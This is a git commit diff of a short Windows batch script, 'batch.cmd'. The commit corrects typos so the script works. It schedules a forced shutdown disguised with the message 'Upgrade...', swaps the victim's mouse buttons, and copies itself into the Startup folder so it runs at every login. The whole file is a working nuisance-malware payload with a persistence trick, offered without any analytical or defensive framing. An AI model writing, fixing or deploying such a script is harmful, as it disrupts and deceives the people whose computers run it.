3e03759c6ea57ad6450cfe77979d69f755a562f4
qsd800 <47152700+qsd800@users.noreply.github.com>
2019-02-07 19:08:48 +0100

    Update batch.cmd

--- batch.cmd
+++ batch.cmd
@@ -1,4 +1,4 @@
 @echo off
 shutdown -s -t 120 -c "Upgrade..."
-Rundll32 user32, SwapeMouseButton
-copy 0% "%userprofile%\Startm~1\Programs\Startup"
+Rundll32 user32, SwapMouseButton
+copy %0 "%userprofile%\Startm~1\Programs\Startup"
